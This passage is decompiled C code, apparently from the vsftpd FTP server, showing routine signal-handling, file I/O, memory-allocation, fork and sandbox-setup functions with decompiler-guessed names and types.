  int v3; // esi

  sub_C750(a1 + 360);
  v1 = sub_C600(a1 + 360, "UTF8 ON");
  v2 = "Always in UTF8 mode.";
  v3 = 200;
  if ( !v1 )
  {
    v2 = "Option not understood.";
    v3 = 501;
  }
  return sub_5560(a1, v3, v2);
}

//----- (00000000000112B0) ----------------------------------------------------
void __noreturn sub_112B0()
{
  sub_4B80();
}

//----- (0000000000011320) ----------------------------------------------------
__int64 sub_11320()
{
  return 0xFFFFFFFFLL;
}
// 11320: using guessed type __int64 sub_11320();

//----- (0000000000011330) ----------------------------------------------------
__int64 sub_11330()
{
  return 0xFFFFFFFFLL;
}
// 11330: using guessed type __int64 sub_11330();

//----- (0000000000011340) ----------------------------------------------------
__int64 sub_11340()
{
  return 0xFFFFFFFFLL;
}
// 11340: using guessed type __int64 sub_11340();

//----- (0000000000011350) ----------------------------------------------------
__int64 sub_11350()
{
  return 1LL;
}
// 11350: using guessed type __int64 sub_11350();

//----- (00000000000113A0) ----------------------------------------------------
__int64 sub_113A0()
{
  return 0xFFFFFFFFLL;
}
// 113A0: using guessed type __int64 sub_113A0();

//----- (00000000000113B0) ----------------------------------------------------
void __fastcall __noreturn sub_113B0(__int64 a1)
{
  char v1; // al
  char v2; // r14
  int v3; // eax
  int v4; // r14d
  unsigned int v5; // eax
  int v6; // eax
  int v7; // eax
  int v8; // eax
  int v9; // eax
  __int64 v10[9]; // [rsp+0h] [rbp-48h] BYREF

  v10[0] = 0LL;
  v10[1] = 0LL;
  v10[3] = __readfsqword(0x28u);
  sub_C4B0((__int64)v10, 0x10000);
  sub_12830();
  sub_8FF0(a1);
  if ( dword_221C60 )
    sub_161F0("SSL handler");
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        v1 = sub_9100(*(_DWORD *)(a1 + 460));
        if ( v1 != 4 )
          break;
LABEL_15:
        v4 = sub_111A0((_DWORD *)a1, (__int64 *)(a1 + 344), *(_BYTE **)(a1 + 16));
        sub_91B0(*(_DWORD *)(a1 + 460), v4);
        if ( v4 >= 0 )
          sub_91E0(*(_DWORD *)(a1 + 460), (_QWORD *)(a1 + 344));
      }
LABEL_4:
      if ( v1 != 5 )
        break;
      sub_9330(*(_DWORD *)(a1 + 460), (__int64 *)(a1 + 344));
      v7 = sub_10F60(a1, (_QWORD *)(a1 + 344), 1);
      sub_91B0(*(_DWORD *)(a1 + 460), v7);
    }
    switch ( v1 )
    {
      case 6:
        if ( *(_DWORD *)(a1 + 40) != -1 || *(_QWORD *)(a1 + 432) )
          sub_4B30("state not clean");
        v5 = sub_91A0(*(unsigned int *)(a1 + 460));
        *(_DWORD *)(a1 + 40) = v5;
        v6 = sub_11340(a1, v5);
        if ( v6 != 1 )
        {
          sub_13880(*(_DWORD *)(a1 + 40));
          *(_DWORD *)(a1 + 40) = -1;
          LOBYTE(v6) = 2;
        }
        sub_9160(*(_DWORD *)(a1 + 460), v6);
        break;
      case 8:
        sub_C470(v10, 0x10000u);
        v8 = sub_113A0(a1, *(_QWORD *)(a1 + 432), v10);
        sub_91B0(*(_DWORD *)(a1 + 460), v8);
        sub_91E0(*(_DWORD *)(a1 + 460), v10);
        break;
      case 9:
        sub_9330(*(_DWORD *)(a1 + 460), v10);
        sub_C500((__int64)v10);
        sub_C510(v10);
        v9 = sub_11320(*(_QWORD *)(a1 + 432));
        sub_91B0(*(_DWORD *)(a1 + 460), v9);
        break;
      case 7:
        if ( *(_DWORD *)(a1 + 40) != -1 || (v2 = 1, *(_QWORD *)(a1 + 432)) )
        {
          v3 = sub_11350(a1);
          v2 = v3;
          if ( v3 != 1 )
            v2 = 2;
          sub_13880(*(_DWORD *)(a1 + 40));
          *(_DWORD *)(a1 + 40) = -1;
        }
        sub_9160(*(_DWORD *)(a1 + 460), v2);
        v1 = sub_9100(*(_DWORD *)(a1 + 460));
        if ( v1 == 4 )
          goto LABEL_15;
        goto LABEL_4;
      default:
        sub_4B80();
    }
  }
}
// 91A0: using guessed type __int64 __fastcall sub_91A0(_QWORD);
// 11320: using guessed type __int64 __fastcall sub_11320(_QWORD);
// 11340: using guessed type __int64 __fastcall sub_11340(_QWORD, _QWORD);
// 11350: using guessed type __int64 __fastcall sub_11350(_QWORD);
// 113A0: using guessed type __int64 __fastcall sub_113A0(_QWORD, _QWORD, _QWORD);
// 221C60: using guessed type int dword_221C60;

//----- (0000000000011640) ----------------------------------------------------
__int64 sub_11640()
{
  return 0LL;
}
// 11640: using guessed type __int64 sub_11640();

//----- (0000000000011660) ----------------------------------------------------
__int64 sub_11660()
{
  return 0xFFFFFFFFLL;
}
// 11660: using guessed type __int64 sub_11660();

//----- (0000000000011670) ----------------------------------------------------
__int64 sub_11670()
{
  return 0xFFFFFFFFLL;
}
// 11670: using guessed type __int64 sub_11670();

//----- (0000000000011870) ----------------------------------------------------
__int64 sub_11870()
{
  return 0xFFFFFFFFLL;
}
// 11870: using guessed type __int64 sub_11870();

//----- (0000000000011890) ----------------------------------------------------
__int64 sub_11890()
{
  return 0xFFFFFFFFLL;
}
// 11890: using guessed type __int64 sub_11890();

//----- (00000000000119F0) ----------------------------------------------------
__int64 __fastcall sub_119F0(__int64 a1)
{
  __int64 result; // rax
  __int64 v2; // [rsp+8h] [rbp-20h] BYREF
  __int64 v3[3]; // [rsp+10h] [rbp-18h] BYREF

  v3[1] = __readfsqword(0x28u);
  result = sub_11870(a1, 1LL, &v2);
  if ( !(_DWORD)result )
  {
    result = sub_11870(a1, 2LL, v3);
    if ( !(_DWORD)result )
    {
      if ( v2 == 1 )
        return (unsigned int)-(v3[0] != 4);
      else
        return 0xFFFFFFFFLL;
    }
  }
  return result;
}
// 11870: using guessed type __int64 __fastcall sub_11870(_QWORD, _QWORD, _QWORD);

//----- (0000000000011A80) ----------------------------------------------------
__int64 __fastcall sub_11A80(__int64 a1)
{
  __int64 result; // rax
  __int64 v2; // [rsp+8h] [rbp-20h] BYREF
  __int64 v3[3]; // [rsp+10h] [rbp-18h] BYREF

  v3[1] = __readfsqword(0x28u);
  result = sub_11870(a1, 1LL, &v2);
  if ( !(_DWORD)result )
  {
    result = sub_11870(a1, 2LL, v3);
    if ( !(_DWORD)result )
    {
      if ( v2 == 1 )
      {
        result = 0xFFFFFFFFLL;
        if ( v3[0] <= 0xDuLL )
          return (unsigned int)-(((0x2604uLL >> SLOBYTE(v3[0])) & 1) == 0);
      }
      else if ( v2 == 6 )
      {
        if ( v3[0] != 1 )
          return 4294967294LL;
      }
      else if ( v2 )
      {
        return 4294967292LL;
      }
      else if ( v3[0] != 1 )
      {
        return 4294967293LL;
      }
    }
  }
  return result;
}
// 11870: using guessed type __int64 __fastcall sub_11870(_QWORD, _QWORD, _QWORD);

//----- (0000000000011B60) ----------------------------------------------------
__int64 __fastcall sub_11B60(__int64 a1, _WORD **a2)
{
  _WORD *v3; // rdi
  unsigned __int64 v4; // rbx
  __int64 result; // rax
  __int64 v6; // [rsp+8h] [rbp-30h] BYREF
  __int64 v7[5]; // [rsp+10h] [rbp-28h] BYREF

  v3 = *a2;
  v7[1] = __readfsqword(0x28u);
  v4 = (-(__int64)!sub_14950(v3) & 0xFFFFFFFFFFFFFFF8LL) + 10;
  result = sub_11870(a1, 0LL, &v6);
  if ( !(_DWORD)result )
  {
    result = sub_11870(a1, 1LL, v7);
    if ( !(_DWORD)result )
    {
      if ( v6 == v4 )
        return (unsigned int)-(v7[0] != 1);
      else
        return 0xFFFFFFFFLL;
    }
  }
  return result;
}
// 11870: using guessed type __int64 __fastcall sub_11870(_QWORD, _QWORD, _QWORD);

//----- (0000000000011C00) ----------------------------------------------------
__int64 __fastcall sub_11C00(__int64 a1, _WORD **a2)
{
  _WORD *v3; // rdi
  _BOOL4 v4; // eax
  unsigned __int64 v5; // rbx
  unsigned __int64 v6; // rbp
  unsigned int v7; // r12d
  size_t v9; // r15
  unsigned __int16 *v10; // rbx
  __int64 v11; // rax
  __int64 v12; // [rsp+8h] [rbp-50h] BYREF
  size_t size[9]; // [rsp+10h] [rbp-48h] BYREF

  v3 = *a2;
  size[1] = __readfsqword(0x28u);
  v4 = sub_14950(v3);
  v5 = (-(__int64)!v4 & 0xFFFFFFFFFFFFFFF4LL) + 28;
  v6 = (-(__int64)!v4 & 0xFFFFFFFFFFFFFFF8LL) + 10;
  v7 = sub_11870(a1, 1LL, &v12);
  if ( !v7 )
  {
    v7 = sub_11870(a1, 2LL, size);
    if ( !v7 )
    {
      v9 = size[0];
      v7 = -1;
      if ( size[0] == v5 )
      {
        v10 = (unsigned __int16 *)sub_12AE0(LODWORD(size[0]));
        v7 = sub_11890(a1, v12, v9, v10);
        if ( v7 )
        {
          v7 = -2;
          sub_12BB0(v10);
        }
        else
        {
          v11 = *v10;
          if ( v11 == v6 )
          {
            if ( v11 == 2 )
            {
              sub_147A0((void **)&qword_220D80);
              sub_14960((_WORD *)qword_220D80, v10 + 2);
            }
            else
            {
              sub_147C0((void **)&qword_220D80);
              sub_14A10((_WORD *)qword_220D80, v10 + 4);
            }
            if ( sub_14880(a2[1], (unsigned __int16 *)qword_220D80) )
            {
              sub_12BB0(v10);
            }
            else
            {
              sub_12BB0(v10);
              return (unsigned int)-4;
            }
          }
          else
          {
            v7 = -3;
            sub_12BB0(v10);
          }
        }
      }
    }
  }
  return v7;
}
// 11870: using guessed type __int64 __fastcall sub_11870(_QWORD, _QWORD, _QWORD);
// 11890: using guessed type __int64 __fastcall sub_11890(_QWORD, _QWORD, _QWORD, _QWORD);
// 220D80: using guessed type __int64 qword_220D80;

//----- (0000000000011D90) ----------------------------------------------------
__int64 __fastcall sub_11D90(__int64 a1, __int64 a2)
{
  int v2; // r12d
  __int64 result; // rax

  v2 = *(_DWORD *)(a2 + 72);
  nullsub_11();
  nullsub_17(a1);
  nullsub_18(a1);
  nullsub_41(a1);
  nullsub_12(a1);
  nullsub_13(a1);
  nullsub_16(a1);
  nullsub_19(a1);
  nullsub_20(a1);
  nullsub_21(a1);
  nullsub_22(a1);
  nullsub_23(a1);
  nullsub_24(a1, 0LL);
  nullsub_25(a1);
  nullsub_28(a1);
  nullsub_26(a1);
  nullsub_40(a1);
  nullsub_27(a1);
  nullsub_29(a1);
  nullsub_30(a1);
  nullsub_37(a1);
  nullsub_42(a1);
  if ( !dword_221B38 && !seconds && !dword_221BE4 )
  {
    if ( !dword_221B4C )
      goto LABEL_7;
    goto LABEL_24;
  }
  nullsub_14(a1);
  if ( seconds || dword_221BE4 )
    nullsub_15(a1);
  if ( dword_221B4C )
LABEL_24:
    nullsub_46(a1);
LABEL_7:
  nullsub_38(a1);
  nullsub_60(a1);
  nullsub_48(a1);
  nullsub_49(a1, sub_11B60, a2);
  nullsub_50(a1);
  nullsub_51(a1, sub_11C00, a2);
  nullsub_56(a1);
  nullsub_57(a1, sub_11A80, 0LL);
  nullsub_60(a1);
  result = (unsigned int)dword_221A78;
  if ( dword_221A78 )
  {
    nullsub_52(a1);
    nullsub_53(a1, sub_11C00, a2);
    nullsub_58(a1);
    result = nullsub_59(a1, sub_119F0, 0LL);
  }
  if ( dword_221BC4 )
  {
    nullsub_54(a1);
    result = nullsub_55(a1);
  }
  if ( dword_221BF4 )
  {
    if ( v2 )
    {
      if ( dword_221A94 )
        result = nullsub_24(a1, 1LL);
      if ( dword_221A8C )
        result = nullsub_32(a1);
      if ( dword_221AD8 )
      {
        nullsub_31(a1);
        nullsub_33(a1);
        nullsub_34(a1);
        result = nullsub_47(a1);
        if ( dword_2219FC )
          result = nullsub_35(a1);
      }
      if ( dword_221C18 )
      {
        nullsub_43(a1);
        return nullsub_45(a1);
      }
    }
    else
    {
      nullsub_24(a1, 1LL);
      nullsub_32(a1);
      nullsub_31(a1);
      nullsub_33(a1);
      nullsub_34(a1);
      nullsub_47(a1);
      result = (unsigned int)dword_2219FC;
      if ( dword_2219FC )
        result = nullsub_35(a1);
      if ( dword_221AE8 )
        return nullsub_44(a1);
    }
  }
  return result;
}
// 11690: using guessed type __int64 nullsub_11(void);
// 116A0: using guessed type __int64 __fastcall nullsub_12(_QWORD);
// 116B0: using guessed type __int64 __fastcall nullsub_13(_QWORD);
// 116C0: using guessed type __int64 __fastcall nullsub_14(_QWORD);
// 116D0: using guessed type __int64 __fastcall nullsub_15(_QWORD);
// 116E0: using guessed type __int64 __fastcall nullsub_16(_QWORD);
// 116F0: using guessed type __int64 __fastcall nullsub_17(_QWORD);
// 11700: using guessed type __int64 __fastcall nullsub_18(_QWORD);
// 11710: using guessed type __int64 __fastcall nullsub_19(_QWORD);
// 11720: using guessed type __int64 __fastcall nullsub_20(_QWORD);
// 11730: using guessed type __int64 __fastcall nullsub_21(_QWORD);
// 11740: using guessed type __int64 __fastcall nullsub_22(_QWORD);
// 11750: using guessed type __int64 __fastcall nullsub_23(_QWORD);
// 11760: using guessed type __int64 __fastcall nullsub_24(_QWORD, _QWORD);
// 11770: using guessed type __int64 __fastcall nullsub_25(_QWORD);
// 11780: using guessed type __int64 __fastcall nullsub_26(_QWORD);
// 11790: using guessed type __int64 __fastcall nullsub_27(_QWORD);
// 117A0: using guessed type __int64 __fastcall nullsub_28(_QWORD);
// 117B0: using guessed type __int64 __fastcall nullsub_29(_QWORD);
// 117C0: using guessed type __int64 __fastcall nullsub_30(_QWORD);
// 117D0: using guessed type __int64 __fastcall nullsub_31(_QWORD);
// 117E0: using guessed type __int64 __fastcall nullsub_32(_QWORD);
// 117F0: using guessed type __int64 __fastcall nullsub_33(_QWORD);
// 11800: using guessed type __int64 __fastcall nullsub_34(_QWORD);
// 11810: using guessed type __int64 __fastcall nullsub_35(_QWORD);
// 11830: using guessed type __int64 __fastcall nullsub_37(_QWORD);
// 11840: using guessed type __int64 __fastcall nullsub_38(_QWORD);
// 118A0: using guessed type __int64 __fastcall nullsub_40(_QWORD);
// 118B0: using guessed type __int64 __fastcall nullsub_41(_QWORD);
// 118C0: using guessed type __int64 __fastcall nullsub_42(_QWORD);
// 118D0: using guessed type __int64 __fastcall nullsub_43(_QWORD);
// 118E0: using guessed type __int64 __fastcall nullsub_44(_QWORD);
// 118F0: using guessed type __int64 __fastcall nullsub_45(_QWORD);
// 11900: using guessed type __int64 __fastcall nullsub_46(_QWORD);
// 11910: using guessed type __int64 __fastcall nullsub_47(_QWORD);
// 11920: using guessed type __int64 __fastcall nullsub_48(_QWORD);
// 11930: using guessed type __int64 __fastcall nullsub_49(_QWORD, _QWORD, _QWORD);
// 11940: using guessed type __int64 __fastcall nullsub_50(_QWORD);
// 11950: using guessed type __int64 __fastcall nullsub_51(_QWORD, _QWORD, _QWORD);
// 11960: using guessed type __int64 __fastcall nullsub_52(_QWORD);
// 11970: using guessed type __int64 __fastcall nullsub_53(_QWORD, _QWORD, _QWORD);
// 11980: using guessed type __int64 __fastcall nullsub_54(_QWORD);
// 11990: using guessed type __int64 __fastcall nullsub_55(_QWORD);
// 119A0: using guessed type __int64 __fastcall nullsub_56(_QWORD);
// 119B0: using guessed type __int64 __fastcall nullsub_57(_QWORD, _QWORD, _QWORD);
// 119C0: using guessed type __int64 __fastcall nullsub_58(_QWORD);
// 119D0: using guessed type __int64 __fastcall nullsub_59(_QWORD, _QWORD, _QWORD);
// 119E0: using guessed type __int64 __fastcall nullsub_60(_QWORD);
// 2219FC: using guessed type int dword_2219FC;
// 221A78: using guessed type int dword_221A78;
// 221A8C: using guessed type int dword_221A8C;
// 221A94: using guessed type int dword_221A94;
// 221AD8: using guessed type int dword_221AD8;
// 221AE8: using guessed type int dword_221AE8;
// 221B38: using guessed type int dword_221B38;
// 221B4C: using guessed type int dword_221B4C;
// 221BC4: using guessed type int dword_221BC4;
// 221BF4: using guessed type int dword_221BF4;
// 221C18: using guessed type int dword_221C18;

//----- (00000000000120B0) ----------------------------------------------------
unsigned int sub_120B0()
{
  return alarm(1u);
}

//----- (00000000000120C0) ----------------------------------------------------
__int64 __fastcall sub_120C0(int a1)
{
  __int64 result; // rax

  switch ( a1 )
  {
    case 1:
      result = 14LL;
      break;
    case 2:
      result = 15LL;
      break;
    case 3:
      result = 17LL;
      break;
    case 4:
      result = 13LL;
      break;
    case 5:
      result = 23LL;
      break;
    case 6:
      result = 1LL;
      break;
    default:
      sub_4B30("unknown signal in vsf_sysutil_translate_sig");
  }
  return result;
}

//----- (0000000000012160) ----------------------------------------------------
int __fastcall sub_12160(unsigned int a1)
{
  void *v1; // rax
  char *v2; // rdi

  if ( a1 <= 0x40 )
  {
    v1 = &unk_220FA0;
    v2 = (char *)&unk_220FA0 + 32 * (int)a1;
    if ( *(_QWORD *)v2 )
    {
      LODWORD(v1) = *((_DWORD *)v2 + 6);
      *((_DWORD *)v2 + 4) = 1;
      if ( (_DWORD)v1 )
        LODWORD(v1) = alarm(1u);
    }
  }
  return (int)v1;
}
// 1218A: variable 'v1' is possibly undefined

//----- (00000000000121A0) ----------------------------------------------------
void *__fastcall sub_121A0(void *a1, unsigned int a2)
{
  return memset(a1, 0, a2);
}

//----- (00000000000121B0) ----------------------------------------------------
unsigned __int64 __fastcall sub_121B0(int sig, void (*a2)(int))
{
  struct sigaction v3; // [rsp+0h] [rbp-B8h] BYREF
  unsigned __int64 v4; // [rsp+98h] [rbp-20h]

  v4 = __readfsqword(0x28u);
  sub_121A0(&v3, 0x98u);
  v3.sa_handler = a2;
  if ( sigfillset(&v3.sa_mask) )
    sub_4B80();
  if ( sigaction(sig, &v3, 0LL) )
    sub_4B80();
  return __readfsqword(0x28u) ^ v4;
}

//----- (0000000000012250) ----------------------------------------------------
void *__fastcall sub_12250(void *dest, const void *a2, int a3)
{
  if ( a3 < 0 )
    sub_4B80();
  return memcpy(dest, a2, (unsigned int)a3);
}

//----- (00000000000122A0) ----------------------------------------------------
__int64 __fastcall sub_122A0(char *a1, const char *a2, unsigned int a3)
{
  char *v4; // rcx
  __int64 result; // rax

  v4 = strncpy(a1, a2, a3);
  result = a3 - 1;
  v4[result] = 0;
  return result;
}

//----- (00000000000122C0) ----------------------------------------------------
int __fastcall sub_122C0(int a1, int a2)
{
  int result; // eax

  result = dup2(a1, a2);
  if ( a2 != result )
    sub_4B80();
  return result;
}

//----- (00000000000122F0) ----------------------------------------------------
char *sub_122F0()
{
  char *v0; // rax
  int i; // edx
  __int64 v2; // rax
  char *result; // rax

  qword_2217C8 = 0LL;
  dword_2208AC = -1;
  qword_220F90 = 0LL;
  v0 = (char *)&unk_220FA0;
  do
  {
    *(_QWORD *)v0 = 0LL;
    v0 += 32;
  }
  while ( (char *)&unk_220FA0 + 2080 != v0 );
  for ( i = 0; i != 65; ++i )
  {
    v2 = i;
    result = (char *)&unk_220FA0 + 32 * v2;
    *((_DWORD *)result + 4) = 0;
  }
  return result;
}
// 2208AC: using guessed type int dword_2208AC;
// 220F90: using guessed type __int64 qword_220F90;
// 2217C8: using guessed type __int64 qword_2217C8;

//----- (0000000000012360) ----------------------------------------------------
__int64 __fastcall sub_12360(int a1, unsigned int a2, unsigned int a3)
{
  int v3; // ebx
  unsigned int *v4; // rbp
  __int64 result; // rax
  __int64 v6; // rdi
  unsigned int v7; // eax

  if ( qword_220F90 && !dword_220F80 && a1 == 1 )
  {
    dword_220F80 = 1;
    qword_220F90(a2, a3, qword_220F88);
    dword_220F80 = 0;
  }
  v3 = 0;
  v4 = dword_220FA0;
  do
  {
    result = dword_220FA0[8 * v3 + 4];
    if ( (_DWORD)result && !v4[5] )
    {
      v7 = v4[6];
      v4[5] = 1;
      if ( v7 )
        alarm(0);
      result = *(_QWORD *)v4;
      if ( *(_QWORD *)v4 )
      {
        v6 = *((_QWORD *)v4 + 1);
        dword_220FA0[8 * v3 + 4] = 0;
        result = ((__int64 (__fastcall *)(__int64))result)(v6);
      }
      v4[5] = 0;
    }
    ++v3;
    v4 += 8;
  }
  while ( v3 != 65 );
  return result;
}
// 220F90: invalid function type '?' has been ignored
// 220F80: using guessed type int dword_220F80;
// 220F88: using guessed type __int64 qword_220F88;
// 220F90: using guessed type __int64 (__fastcall *qword_220F90)(_QWORD, _QWORD, _QWORD);
// 220FA0: using guessed type unsigned int dword_220FA0[520];

//----- (0000000000012440) ----------------------------------------------------
__int64 __fastcall sub_12440(int fd, __int16 a2)
{
  int *v2; // r13
  int v3; // ebx
  int v4; // ebp
  __int16 v6[4]; // [rsp+0h] [rbp-58h] BYREF
  __int64 v7; // [rsp+8h] [rbp-50h]
  __int64 v8; // [rsp+10h] [rbp-48h]
  unsigned __int64 v9; // [rsp+28h] [rbp-30h]

  v9 = __readfsqword(0x28u);
  sub_121A0(v6, 0x20u);
  v6[0] = a2;
  v7 = 0LL;
  v6[1] = 0;
  v8 = 0LL;
  v2 = __errno_location();
  do
  {
    v3 = fcntl(fd, 7, v6);
    v4 = *v2;
    sub_12360(0, 0, 0);
  }
  while ( v3 < 0 && v4 == 4 );
  return (unsigned int)v3;
}

//----- (00000000000124F0) ----------------------------------------------------
unsigned __int64 __fastcall sub_124F0(int a1, __int64 a2, __int64 a3, unsigned int a4)
{
  int v6; // ebx
  unsigned int *v7; // rcx
  unsigned __int64 result; // rax

  v6 = sub_120C0(a1);
  v7 = &dword_220FA0[8 * v6];
  *((_QWORD *)v7 + 1) = a3;
  *(_QWORD *)v7 = a2;
  v7[6] = a4;
  result = sub_121B0(v6, (void (*)(int))sub_12160);
  if ( a4 )
  {
    if ( v6 != 14 )
      return sub_121B0(14, (void (*)(int))sub_120B0);
  }
  return result;
}
// 220FA0: using guessed type unsigned int dword_220FA0[520];

//----- (0000000000012570) ----------------------------------------------------
unsigned int *__fastcall sub_12570(int a1)
{
  int v1; // eax
  __int64 v2; // rbx
  unsigned int *result; // rax
  unsigned int *v4; // rbx

  v1 = sub_120C0(a1);
  v2 = 8LL * v1;
  sub_121B0(v1, 0LL);
  result = dword_220FA0;
  v4 = &dword_220FA0[v2];
  *((_QWORD *)v4 + 1) = 0LL;
  *(_QWORD *)v4 = 0LL;
  return result;
}
// 220FA0: using guessed type unsigned int dword_220FA0[520];

//----- (00000000000125B0) ----------------------------------------------------
unsigned __int64 __fastcall sub_125B0(int a1)
{
  int v1; // eax
  unsigned int *v2; // rdx

  v1 = sub_120C0(a1);
  v2 = &dword_220FA0[8 * v1];
  *((_QWORD *)v2 + 1) = 0LL;
  *(_QWORD *)v2 = 0LL;
  return sub_121B0(v1, (void (*)(int))sub_12160);
}
// 220FA0: using guessed type unsigned int dword_220FA0[520];

//----- (00000000000125F0) ----------------------------------------------------
unsigned __int64 __fastcall sub_125F0(int a1)
{
  int v1; // ebp
  sigset_t v3; // [rsp+0h] [rbp-A8h] BYREF
  unsigned __int64 v4; // [rsp+88h] [rbp-20h]

  v4 = __readfsqword(0x28u);
  v1 = sub_120C0(a1);
  if ( sigemptyset(&v3) )
    sub_4B80();
  if ( sigaddset(&v3, v1) )
    sub_4B80();
  if ( sigprocmask(0, &v3, 0LL) )
    sub_4B80();
  return __readfsqword(0x28u) ^ v4;
}

//----- (00000000000126A0) ----------------------------------------------------
unsigned __int64 __fastcall sub_126A0(int a1, void (*a2)(int))
{
  int v2; // ebx
  unsigned int *v3; // rdx

  v2 = sub_120C0(a1);
  v3 = &dword_220FA0[8 * v2];
  *((_QWORD *)v3 + 1) = 0LL;
  *(_QWORD *)v3 = 0LL;
  sub_125F0(a1);
  return sub_121B0(v2, a2);
}
// 220FA0: using guessed type unsigned int dword_220FA0[520];

//----- (00000000000126F0) ----------------------------------------------------
unsigned __int64 __fastcall sub_126F0(int a1)
{
  int v1; // ebp
  sigset_t v3; // [rsp+0h] [rbp-A8h] BYREF
  unsigned __int64 v4; // [rsp+88h] [rbp-20h]

  v4 = __readfsqword(0x28u);
  v1 = sub_120C0(a1);
  if ( sigemptyset(&v3) )
    sub_4B80();
  if ( sigaddset(&v3, v1) )
    sub_4B80();
  if ( sigprocmask(1, &v3, 0LL) )
    sub_4B80();
  return __readfsqword(0x28u) ^ v4;
}

//----- (00000000000127A0) ----------------------------------------------------
void __fastcall sub_127A0(__int64 (__fastcall *a1)(_QWORD, _QWORD, _QWORD), __int64 a2)
{
  if ( qword_220F90 )
    sub_4B30("double register of i/o handler");
  qword_220F90 = a1;
  qword_220F88 = a2;
}
// 220F88: using guessed type __int64 qword_220F88;
// 220F90: using guessed type __int64 (__fastcall *qword_220F90)(_QWORD, _QWORD, _QWORD);

//----- (00000000000127E0) ----------------------------------------------------
void sub_127E0()
{
  if ( !qword_220F90 )
    sub_4B30("no i/o handler to unregister!");
  qword_220F90 = 0LL;
  qword_220F88 = 0LL;
}
// 220F88: using guessed type __int64 qword_220F88;
// 220F90: using guessed type __int64 (__fastcall *qword_220F90)(_QWORD, _QWORD, _QWORD);

//----- (0000000000012830) ----------------------------------------------------
unsigned int sub_12830()
{
  return alarm(0);
}

//----- (0000000000012840) ----------------------------------------------------
__int64 __fastcall sub_12840(unsigned int fd, void *buf, size_t nbytes)
{
  size_t v3; // rbx
  int *v4; // r14
  signed int v5; // r13d
  int v6; // r12d

  v3 = (unsigned int)nbytes;
  v4 = __errno_location();
  do
  {
    v5 = read(fd, buf, v3);
    v6 = *v4;
    sub_12360(1, v5, fd);
  }
  while ( v5 < 0 && v6 == 4 );
  return (unsigned int)v5;
}

//----- (00000000000128B0) ----------------------------------------------------
__int64 __fastcall sub_128B0(unsigned int fd, void *buf, size_t n)
{
  size_t v3; // rbx
  int *v4; // r14
  signed int v5; // r13d
  int v6; // r12d

  v3 = (unsigned int)n;
  v4 = __errno_location();
  do
  {
    v5 = write(fd, buf, v3);
    v6 = *v4;
    sub_12360(1, v5, fd);
  }
  while ( v5 < 0 && v6 == 4 );
  return (unsigned int)v5;
}

//----- (0000000000012920) ----------------------------------------------------
__int64 __fastcall sub_12920(unsigned int fd, __int64 a2, int a3)
{
  unsigned int v3; // ebx
  unsigned int v4; // ebp
  __int64 result; // rax

  v3 = a3;
  if ( a3 < 0 )
    sub_4B80();
  v4 = 0;
  while ( 1 )
  {
    result = sub_12840(fd, (void *)(a2 + (int)v4), v3);
    if ( (int)result < 0 )
      break;
    if ( (_DWORD)result )
    {
      if ( (unsigned int)result > v3 )
        sub_4B80();
      v4 += result;
      v3 -= result;
      if ( v3 )
        continue;
    }
    return v4;
  }
  return result;
}

//----- (00000000000129A0) ----------------------------------------------------
__int64 __fastcall sub_129A0(unsigned int fd, __int64 a2, int a3)
{
  unsigned int v3; // ebx
  unsigned int v4; // ebp
  __int64 result; // rax

  v3 = a3;
  if ( a3 < 0 )
    sub_4B80();
  v4 = 0;
  while ( 1 )
  {
    result = sub_128B0(fd, (void *)(a2 + (int)v4), v3);
    if ( (int)result < 0 )
      break;
    if ( (_DWORD)result )
    {
      if ( (unsigned int)result > v3 )
        sub_4B80();
      v4 += result;
      v3 -= result;
      if ( v3 )
        continue;
    }
    return v4;
  }
  return result;
}

//----- (0000000000012A20) ----------------------------------------------------
__off64_t __fastcall sub_12A20(int a1)
{
  __off64_t result; // rax

  result = lseek64(a1, 0LL, 1);
  if ( result < 0 )
    sub_4B80();
  return result;
}

//----- (0000000000012A60) ----------------------------------------------------
__off64_t __fastcall sub_12A60(int fd, __off64_t a2)
{
  __off64_t result; // rax

  if ( a2 < 0 )
    sub_4B80();
  result = lseek64(fd, a2, 0);
  if ( result < 0 )
    sub_4B80();
  return result;
}

//----- (0000000000012AB0) ----------------------------------------------------
__off64_t __fastcall sub_12AB0(int a1)
{
  __off64_t result; // rax

  result = lseek64(a1, 0LL, 2);
  if ( result < 0 )
    sub_4B80();
  return result;
}

//----- (0000000000012AE0) ----------------------------------------------------
void *__fastcall sub_12AE0(size_t size)
{
  void *result; // rax

  if ( (int)size <= 0 )
    sub_4B30("zero or big size in vsf_sysutil_malloc");
  result = malloc((unsigned int)size);
  if ( !result )
    sub_4B80();
  return result;
}

//----- (0000000000012B40) ----------------------------------------------------
void *__fastcall sub_12B40(void *ptr, size_t size)
{
  void *result; // rax

  if ( (int)size <= 0 )
    sub_4B30("zero or big size in vsf_sysutil_realloc");
  result = realloc(ptr, (unsigned int)size);
  if ( !result )
    sub_4B80();
  return result;
}

//----- (0000000000012BB0) ----------------------------------------------------
void __fastcall sub_12BB0(void *ptr)
{
  if ( !ptr )
    sub_4B30("vsf_sysutil_free got a null pointer");
  free(ptr);
}

//----- (0000000000012BE0) ----------------------------------------------------
__int64 sub_12BE0()
{
  __int64 result; // rax

  result = (unsigned int)dword_2208AC;
  if ( dword_2208AC == -1 )
  {
    result = sub_16AA0();
    dword_2208AC = result;
  }
  return result;
}
// 12BE0: using guessed type __int64 sub_12BE0();
// 16AA0: using guessed type __int64 sub_16AA0(void);
// 2208AC: using guessed type int dword_2208AC;

//----- (0000000000012C10) ----------------------------------------------------
__pid_t sub_12C10()
{
  __pid_t result; // eax

  result = fork();
  if ( result )
  {
    if ( result < 0 )
      sub_4B80();
  }
  else
  {
    sub_122F0();
    return 0;
  }
  return result;
}

//----- (0000000000012C60) ----------------------------------------------------
__pid_t sub_12C60()
{
  __pid_t result; // eax

  result = fork();
  if ( !result )
  {
    sub_122F0();
    return 0;
  }
  return result;
}

//----- (0000000000012C90) ----------------------------------------------------
void __fastcall __noreturn sub_12C90(int status)
{
  void (*v1)(void); // rax

  v1 = (void (*)(void))qword_2217C8;
  if ( qword_2217C8 )
  {
    qword_2217C8 = 0LL;
    v1();
  }
  _exit(status);
}
// 2217C8: using guessed type __int64 qword_2217C8;

//----- (0000000000012CC0) ----------------------------------------------------
__int64 sub_12CC0()
{
  __pid_t v0; // ebp
  __int64 v2[5]; // [rsp+0h] [rbp-28h] BYREF

  v2[1] = __readfsqword(0x28u);
  sub_121A0(v2, 8u);
  while ( 1 )
  {
    v0 = wait((__WAIT_STATUS)((char *)v2 + 4));
    if ( v0 >= 0 || *__errno_location() != 4 )
      break;
    sub_12360(0, 0, 0);
  }
